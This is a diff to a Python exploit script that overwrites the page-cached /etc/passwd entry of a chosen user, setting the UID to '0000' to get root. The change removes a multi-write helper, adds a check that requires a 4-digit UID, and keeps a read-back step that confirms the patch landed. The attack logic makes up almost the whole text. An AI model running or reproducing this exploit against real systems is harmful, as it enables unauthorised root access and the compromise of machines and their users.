@@ -98,18 +98,6 @@ def write4(target_path: str, file_offset: int, four_bytes: bytes) -> None:
         os.close(fd_target)
 
 
-def writeN(target_path: str, file_offset: int, data: bytes) -> None:
-    """Overwrite N bytes of target_path's page cache at file_offset using multiple write4 calls."""
-    offset = 0
-    while offset < len(data):
-        # Get the next 4 bytes (or pad with zeros if less than 4 remain)
-        chunk = data[offset:offset + 4]
-        if len(chunk) < 4:
-            chunk = chunk + b"\x00" * (4 - len(chunk))
-        write4(target_path, file_offset + offset, chunk)
-        offset += 4
-
-
 def find_uid_field(path: str, username: str) -> Tuple[int, str]:
     """Return (file_offset_of_uid_chars, current_uid_string) for username's
     /etc/passwd line."""
@@ -147,18 +135,26 @@ def main(argv: List[str]) -> int:
         print("[!] {}".format(e))
         return 1
     print("[*] {}: {} UID field at offset {} = {!r}".format(
-        PASSWD, user, uid_off, uid_str
-    ))
+    PASSWD, user, uid_off, uid_str
+))
 
-    print("[*] Patching {!r} -> {} '0's in page cache...".format(uid_str, len(uid_str)))
-    writeN(PASSWD, uid_off, b"0" * len(uid_str))
+    if len(uid_str) != 4:
+        print("[!] UID '{}' is {} chars; this technique "
+            "needs a 4-digit UID (e.g. 1000-9999).".format(
+                uid_str, len(uid_str)
+            ))
+        print("[!] Pick a different user or extend with multi-shot writes.")
+        return 1
+
+    print("[*] Patching {!r} -> '0000' in page cache...".format(uid_str))
+    write4(PASSWD, uid_off, b"0000")
 
     # Verify via fresh read (hits the page cache, not disk).
     with open(PASSWD, "rb") as f:
         f.seek(uid_off)
-        landed = f.read(len(uid_str))
+        landed = f.read(4)
     print("[*] Page cache now reads {!r} at offset {}".format(landed, uid_off))
-    if landed != b"0" * len(uid_str):
+    if landed != b"0000":
         print("[!] Patch did not land. Aborting.")
         return 1
 
